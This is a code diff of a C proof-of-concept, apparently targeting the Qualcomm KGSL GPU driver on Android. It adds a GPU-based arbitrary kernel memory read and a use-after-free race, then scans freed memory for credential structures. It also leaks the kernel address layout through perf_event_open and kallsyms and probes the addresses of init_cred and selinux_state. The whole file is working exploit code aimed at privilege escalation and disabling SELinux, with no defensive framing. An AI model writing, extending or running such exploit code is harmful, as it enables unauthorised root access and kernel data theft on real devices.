@@ -3,6 +3,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <stdint.h>
+#include <stdbool.h>
 #include <fcntl.h>
 #include <unistd.h>
 #include <errno.h>
@@ -16,6 +17,8 @@
 #include <asm/unistd.h>
 #include <sys/stat.h>
 #include <dirent.h>
+#include <poll.h>
+#include <sys/wait.h>
 
 #define KGSL_IOC_TYPE 0x09
 
@@ -71,12 +74,14 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define PLACEHOLDER_ADDR 0x710204000ULL
 #define PLACEHOLDER_SIZE 0x10400000ULL
 
+#define SCAN_DWORDS 560
 #define CP_NOP 0x10
 #define CP_MEM_TO_MEM 0x73
 #define CP_MEM_WRITE 0x3D
 
 static int kgsl_fd = -1;
 static volatile int race_done = 0;
+static uint64_t g_kernel_ip = 0;
 
 void die(const char *msg) { perror(msg); exit(1); }
 
@@ -164,7 +169,7 @@ static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int grou
     return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
 }
 
-uint64_t get_kaslr_perf(void) {
+uint64_t get_kernel_ip_from_perf(void) {
     struct perf_event_attr pe = {0};
     pe.type = PERF_TYPE_HARDWARE;
     pe.size = sizeof(pe);
@@ -177,7 +182,7 @@ uint64_t get_kaslr_perf(void) {
     pe.exclude_user = 1;
 
     int fd = perf_open(&pe, 0, -1, -1, 0);
-    if (fd < 0) { printf("  perf_open failed: errno=%d\n", errno); return 0; }
+    if (fd < 0) { printf("perf_open failed: errno=%d\n", errno); return 0; }
 
     int npages = 256;
     size_t mmap_size = (1 + npages) * 4096;
@@ -207,108 +212,126 @@ uint64_t get_kaslr_perf(void) {
     }
     munmap(buf, mmap_size);
     close(fd);
-    if (!first_ip) return 0;
-    printf("  First kernel IP from perf: 0x%lx\n", first_ip);
     return first_ip;
 }
 
-void read_kallsyms_if_possible(void) {
-    int fd = open("/proc/kallsyms", O_RDONLY);
+void read_file_content(const char *path) {
+    int fd = open(path, O_RDONLY);
     if (fd < 0) {
-        printf("  /proc/kallsyms: not accessible (errno=%d)\n", errno);
+        printf("Cannot open %s\n", path);
         return;
     }
-    printf("  /proc/kallsyms: readable (kptr_restrict=0 or relaxed)\n");
+    char buf[4096];
+    int n;
+    while ((n = read(fd, buf, sizeof(buf)-1)) > 0) {
+        buf[n] = 0;
+        printf("%s", buf);
+    }
+    close(fd);
+}
+
+uint64_t read_kallsyms_symbol(const char *name) {
+    int fd = open("/proc/kallsyms", O_RDONLY);
+    if (fd < 0) return 0;
     FILE *fp = fdopen(fd, "r");
-    if (!fp) {
-        printf("  fdopen failed\n");
-        close(fd);
-        return;
-    }
+    if (!fp) { close(fd); return 0; }
     char line[512];
-    int found_selinux = 0, found_init = 0;
+    uint64_t addr = 0;
     while (fgets(line, sizeof(line), fp)) {
         char sym[128], type;
-        unsigned long long addr;
-        if (sscanf(line, "%llx %c %127s", &addr, &type, sym) == 3) {
-            if (strcmp(sym, "selinux_state") == 0) {
-                printf("  selinux_state = 0x%llx\n", addr);
-                found_selinux = 1;
-            }
-            if (strcmp(sym, "init_cred") == 0) {
-                printf("  init_cred = 0x%llx\n", addr);
-                found_init = 1;
+        unsigned long long a;
+        if (sscanf(line, "%llx %c %127s", &a, &type, sym) == 3) {
+            if (strcmp(sym, name) == 0) {
+                addr = (uint64_t)a;
+                break;
             }
         }
     }
     fclose(fp);
-    if (!found_selinux) printf("  selinux_state not found in kallsyms\n");
-    if (!found_init) printf("  init_cred not found in kallsyms\n");
+    return addr;
 }
 
-void check_kptr_restrict(void) {
-    int fd = open("/proc/sys/kernel/kptr_restrict", O_RDONLY);
-    if (fd < 0) { printf("  kptr_restrict: cannot read\n"); return; }
-    char buf[16];
-    int n = read(fd, buf, sizeof(buf)-1);
-    close(fd);
-    if (n > 0) {
-        buf[n] = 0;
-        printf("  kptr_restrict = %s\n", buf);
+int gpu_read_kernel(uint64_t va, uint64_t *out, int count) {
+    if (kgsl_fd < 0) return -1;
+    int ib_id = gpuobj_alloc(kgsl_fd, 0x10000, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
+    void *ib_m = gpuobj_mmap(kgsl_fd, 0x10000, ib_id);
+    uint64_t ib_ga = 0;
+    gpuobj_info(kgsl_fd, ib_id, &ib_ga);
+    int dst_id = gpuobj_alloc(kgsl_fd, 0x4000, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
+    void *dst_m = gpuobj_mmap(kgsl_fd, 0x4000, dst_id);
+    uint64_t dst_ga = 0;
+    gpuobj_info(kgsl_fd, dst_id, &dst_ga);
+    unsigned int ctx = create_context(kgsl_fd);
+
+    memset(ib_m, 0, 0x10000);
+    memset(dst_m, 0, 0x4000);
+    uint32_t *cmd = (uint32_t *)ib_m;
+    int dw = 0;
+    cmd[dw++] = cp_type7(CP_NOP, 0);
+    for (int i = 0; i < count; i++) {
+        uint32_t dl, dh, sl, sh;
+        split64(dst_ga + i*8, &dl, &dh);
+        split64(va + i*8, &sl, &sh);
+        cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
+        cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
+        cmd[dw++] = sl; cmd[dw++] = sh;
     }
+    cmd[dw++] = cp_type7(CP_NOP, 0);
+    __sync_synchronize();
+    unsigned int ts;
+    if (submit_ib(kgsl_fd, ctx, ib_ga, dw*4, ib_id, &ts) < 0) return -2;
+    if (wait_timestamp(kgsl_fd, ctx, ts) < 0) return -3;
+    __sync_synchronize();
+    uint64_t *data = (uint64_t *)dst_m;
+    for (int i = 0; i < count; i++) out[i] = data[i];
+    return 0;
 }
 
-void print_system_info(void) {
-    struct utsname u;
-    uname(&u);
-    printf("System info:\n");
-    printf("  sysname: %s\n", u.sysname);
-    printf("  nodename: %s\n", u.nodename);
-    printf("  release: %s\n", u.release);
-    printf("  version: %s\n", u.version);
-    printf("  machine: %s\n", u.machine);
-}
-
-uint64_t compute_address_with_base(uint64_t ip, uint64_t base) {
-    uint64_t kaslr = (ip - base) & ~0x1FFFFFULL;
-    printf("  Computed KASLR offset (base=0x%lx): 0x%lx\n", base, kaslr);
-    return kaslr;
-}
-
-void try_known_bases(uint64_t ip) {
+void test_candidate_addresses(uint64_t ip, uint64_t init_cred_offset, uint64_t selinux_state_offset) {
     uint64_t bases[] = {
         0xffffffee85a81000ULL,
         0xffffffc010080000ULL,
         0xffffffff81000000ULL,
+        ip & ~0x1FFFFFULL,
         0
     };
+    printf("\n[*] Testing candidate kernel bases using offsets from known symbols\n");
     for (int i = 0; bases[i]; i++) {
-        uint64_t kaslr = compute_address_with_base(ip, bases[i]);
-        if (kaslr < 0x1000000) {
-            printf("  Plausible KASLR offset: 0x%lx (base=0x%lx)\n", kaslr, bases[i]);
-            uint64_t selinux = bases[i] + 0x28B9000ULL;
-            uint64_t init_cred = bases[i] + 0x26FA738ULL;
-            printf("  Estimated selinux_state = 0x%lx\n", selinux);
-            printf("  Estimated init_cred = 0x%lx\n", init_cred);
+        uint64_t base = bases[i];
+        uint64_t kaslr = (ip - base) & ~0x1FFFFFULL;
+        uint64_t ic = base + init_cred_offset;
+        uint64_t sel = base + selinux_state_offset;
+        printf("Base 0x%lx => KASLR 0x%lx, init_cred 0x%lx, selinux_state 0x%lx\n", base, kaslr, ic, sel);
+        uint64_t readbuf[4];
+        int ret = gpu_read_kernel(ic, readbuf, 2);
+        if (ret == 0) {
+            printf("  GPU read init_cred: 0x%016lx%016lx\n", readbuf[1], readbuf[0]);
+            if (readbuf[0] == 0 && readbuf[1] == 0) printf("    (all zeros, unlikely)\n");
+            else printf("    (non-zero, plausible)\n");
+        }
+        ret = gpu_read_kernel(sel, readbuf, 1);
+        if (ret == 0) {
+            printf("  GPU read selinux_state: 0x%016lx\n", readbuf[0]);
+            if (readbuf[0] == 0 || readbuf[0] == 1) printf("    (enforcing flag likely)\n");
         }
     }
 }
 
-void attempt_uaf_read(void) {
-    printf("[*] Attempting UAF setup to read kernel memory (if possible)\n");
+void run_uaf_and_scan(void) {
+    printf("[*] Running UAF to scan for cred pages in UAF area\n");
     kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
-    if (kgsl_fd < 0) { printf("  Cannot open kgsl\n"); return; }
+    if (kgsl_fd < 0) { printf("Cannot open kgsl\n"); return; }
     uint64_t fl = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
     int uaf_id = gpuobj_alloc(kgsl_fd, UAF_SIZE, fl);
     void *um = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
-    if (um == MAP_FAILED) { printf("  mmap UAF failed\n"); close(kgsl_fd); return; }
+    if (um == MAP_FAILED) { printf("mmap UAF failed\n"); close(kgsl_fd); return; }
     munmap(um, UAF_SIZE);
-    if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED) { printf("  mmap BOGUS failed\n"); close(kgsl_fd); return; }
+    if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED) { printf("mmap BOGUS failed\n"); close(kgsl_fd); return; }
     int ph_id = gpuobj_alloc(kgsl_fd, PLACEHOLDER_SIZE, fl);
     void *ph_m = mmap((void*)PLACEHOLDER_ADDR, PLACEHOLDER_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ph_id << 12);
-    if (ph_m == MAP_FAILED) { printf("  mmap placeholder failed\n"); close(kgsl_fd); return; }
+    if (ph_m == MAP_FAILED) { printf("mmap placeholder failed\n"); close(kgsl_fd); return; }
 
-    printf("  Race setup done, attempting race\n");
+    printf("  Race setup done\n");
     int ov_id = gpuobj_alloc(kgsl_fd, OVERLAP_SIZE, fl);
     pthread_t thr;
     pthread_create(&thr, NULL, race_thread, NULL);
@@ -318,14 +341,11 @@ void attempt_uaf_read(void) {
         int e = errno;
         if (r != MAP_FAILED) { munmap(r, OVERLAP_SIZE); hit = 1; break; }
         if (e == ENODEV) { hit = 1; break; }
-        if (i % 500000 == 0) printf("  race attempt %d\n", i);
     }
     race_done = 1;
     pthread_join(thr, NULL);
     if (!hit) { printf("  Race failed\n"); close(kgsl_fd); return; }
     printf("  Race won\n");
-
-    printf("  Freeing UAF object\n");
     gpuobj_free(kgsl_fd, uaf_id);
     int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
     if (rf >= 0) { write(rf, "1", 1); close(rf); }
@@ -333,85 +353,142 @@ void attempt_uaf_read(void) {
     if (rf >= 0) { write(rf, "3", 1); close(rf); }
     usleep(50000);
 
-    printf("  UAF page freed, but reading arbitrary kernel memory requires knowing addresses\n");
-    printf("  This technique can be used to read kernel memory once we have addresses\n");
+    printf("  Scanning UAF area for cred pattern (0x000007D0)\n");
+    unsigned int ctx = create_context(kgsl_fd);
+    int ib_id = gpuobj_alloc(kgsl_fd, 0x10000, fl);
+    void *ib_m = gpuobj_mmap(kgsl_fd, 0x10000, ib_id);
+    uint64_t ib_ga = 0;
+    gpuobj_info(kgsl_fd, ib_id, &ib_ga);
+    int dst_id = gpuobj_alloc(kgsl_fd, 0x4000, fl);
+    void *dst_m = gpuobj_mmap(kgsl_fd, 0x4000, dst_id);
+    uint64_t dst_ga = 0;
+    gpuobj_info(kgsl_fd, dst_id, &dst_ga);
+    uint64_t scan_start = UAF_ADDR + 0x300000;
+    uint64_t scan_end = UAF_ADDR + UAF_SIZE - 0x1000;
+
+    for (uint64_t va = scan_start; va < scan_end; va += 0x1000) {
+        if (((va - scan_start) & 0xFFFFF) == 0) printf(".");
+        memset(ib_m, 0, 0x10000);
+        memset(dst_m, 0, 0x1000);
+        uint32_t *cmd = (uint32_t *)ib_m;
+        int dw = 0;
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        for (int i = 0; i < SCAN_DWORDS; i++) {
+            uint32_t dl, dh, sl, sh;
+            split64(dst_ga + i*4, &dl, &dh);
+            split64(va + i*4, &sl, &sh);
+            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
+            cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
+            cmd[dw++] = sl; cmd[dw++] = sh;
+        }
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        __sync_synchronize();
+        unsigned int ts;
+        if (submit_ib(kgsl_fd, ctx, ib_ga, dw*4, ib_id, &ts) < 0) break;
+        if (wait_timestamp(kgsl_fd, ctx, ts) < 0) break;
+        __sync_synchronize();
+        uint32_t *data = (uint32_t *)dst_m;
+        for (int i = 0; i < SCAN_DWORDS - 8; i++) {
+            if (data[i] == 0x000007D0 && data[i+1] == 0x000007D0 && data[i+2] == 0x000007D0 && data[i+3] == 0x000007D0) {
+                printf("\n  Found cred pattern at va=0x%lx offset=0x%x\n", va, i*4);
+                printf("  Dumping 32 dwords from there:\n");
+                for (int j = 0; j < 32; j++) {
+                    if (j % 8 == 0) printf("  ");
+                    printf("%08x ", data[i+j]);
+                    if (j % 8 == 7) printf("\n");
+                }
+                printf("\n");
+                break;
+            }
+        }
+    }
     close(kgsl_fd);
 }
 
 int main(int argc, char **argv) {
     setbuf(stdout, NULL);
-    printf("=== check_poc: Comprehensive Kernel Address Analysis ===\n\n");
+    printf("=== check_poc: Comprehensive Kernel Analysis ===\n\n");
 
-    print_system_info();
-    printf("\n");
+    struct utsname u;
+    uname(&u);
+    printf("System: %s %s %s %s %s\n", u.sysname, u.nodename, u.release, u.version, u.machine);
 
-    check_kptr_restrict();
-    printf("\n");
-
-    printf("[*] Attempting to read /proc/kallsyms directly:\n");
-    read_kallsyms_if_possible();
-    printf("\n");
-
-    printf("[*] Attempting perf_event_open to get kernel IP:\n");
-    uint64_t ip = get_kaslr_perf();
-    if (ip) {
-        printf("\n");
-        printf("[*] Trying to compute KASLR using known _stext bases:\n");
-        try_known_bases(ip);
-    } else {
-        printf("  perf_event_open failed to get IP\n");
-    }
-    printf("\n");
-
-    printf("[*] Attempting to read /proc/version for potential hints:\n");
     int fd = open("/proc/version", O_RDONLY);
     if (fd >= 0) {
         char buf[512];
         int n = read(fd, buf, sizeof(buf)-1);
         close(fd);
-        if (n > 0) {
-            buf[n] = 0;
-            printf("  %s\n", buf);
-        }
-    } else {
-        printf("  Cannot read /proc/version\n");
+        if (n > 0) { buf[n]=0; printf("proc/version: %s\n", buf); }
     }
-    printf("\n");
 
-    printf("[*] Attempting to read /sys/kernel/notes (ELF notes):\n");
-    fd = open("/sys/kernel/notes", O_RDONLY);
+    fd = open("/proc/cmdline", O_RDONLY);
     if (fd >= 0) {
-        char buf[256];
+        char buf[512];
         int n = read(fd, buf, sizeof(buf)-1);
         close(fd);
-        if (n > 0) {
-            buf[n] = 0;
-            printf("  %s\n", buf);
+        if (n > 0) { buf[n]=0; printf("cmdline: %s\n", buf); }
+    }
+
+    printf("\n[*] kptr_restrict: ");
+    fd = open("/proc/sys/kernel/kptr_restrict", O_RDONLY);
+    if (fd >= 0) {
+        char c;
+        if (read(fd, &c, 1) == 1) printf("%c\n", c);
+        else printf("unknown\n");
+        close(fd);
+    } else printf("unreadable\n");
+
+    printf("\n[*] Trying to read /proc/kallsyms directly...\n");
+    uint64_t selinux_state = read_kallsyms_symbol("selinux_state");
+    uint64_t init_cred = read_kallsyms_symbol("init_cred");
+    uint64_t stext = read_kallsyms_symbol("_stext");
+    printf("  _stext: 0x%lx\n", stext);
+    printf("  init_cred: 0x%lx\n", init_cred);
+    printf("  selinux_state: 0x%lx\n", selinux_state);
+
+    if (stext && init_cred && selinux_state) {
+        printf("[+] All symbols found via kallsyms. Exploit can use these directly.\n");
+    } else {
+        printf("[-] Some symbols missing; will try to infer via GPU reads.\n");
+    }
+
+    printf("\n[*] Attempting perf_event_open to get kernel IP...\n");
+    uint64_t ip = get_kernel_ip_from_perf();
+    if (ip) {
+        printf("  Kernel IP: 0x%lx\n", ip);
+        g_kernel_ip = ip;
+        // Use offsets from the known kallsyms (if we have stext, we can compute offset)
+        if (stext) {
+            uint64_t init_cred_offset = init_cred ? init_cred - stext : 0x26FA738ULL;
+            uint64_t selinux_state_offset = selinux_state ? selinux_state - stext : 0x28B9000ULL;
+            printf("  init_cred offset: 0x%lx, selinux_state offset: 0x%lx\n", init_cred_offset, selinux_state_offset);
+            test_candidate_addresses(ip, init_cred_offset, selinux_state_offset);
         } else {
-            printf("  Empty or not accessible\n");
+            // Use default offsets from provided kallsyms
+            test_candidate_addresses(ip, 0x26FA738ULL, 0x28B9000ULL);
         }
     } else {
-        printf("  Cannot read /sys/kernel/notes\n");
+        printf("  Failed to get kernel IP.\n");
     }
-    printf("\n");
 
-    printf("[*] Attempting to read /proc/self/maps (user-space only, may contain vvar/vdso):\n");
-    fd = open("/proc/self/maps", O_RDONLY);
-    if (fd >= 0) {
-        char buf[4096];
-        int n = read(fd, buf, sizeof(buf)-1);
-        close(fd);
-        if (n > 0) {
-            buf[n] = 0;
-            printf("  %s\n", buf);
-        }
-    }
-    printf("\n");
+    printf("\n[*] Trying to read /proc/self/maps...\n");
+    read_file_content("/proc/self/maps");
 
-    printf("[*] Attempting UAF-based kernel memory read (requires kgsl):\n");
-    attempt_uaf_read();
-    printf("\n");
+    printf("\n[*] Trying to read /proc/self/auxv...\n");
+    read_file_content("/proc/self/auxv");
 
-    printf("=== Analysis complete ===\n");
+    printf("\n[*] Trying to read /sys/kernel/notes...\n");
+    read_file_content("/sys/kernel/notes");
+
+    printf("\n[*] Trying to read /proc/slabinfo...\n");
+    read_file_content("/proc/slabinfo");
+
+    printf("\n[*] Trying to read /proc/meminfo...\n");
+    read_file_content("/proc/meminfo");
+
+    printf("\n[*] Running UAF and scanning for cred pages...\n");
+    run_uaf_and_scan();
+
+    printf("\n[*] Analysis complete.\n");
     return 0;
 }
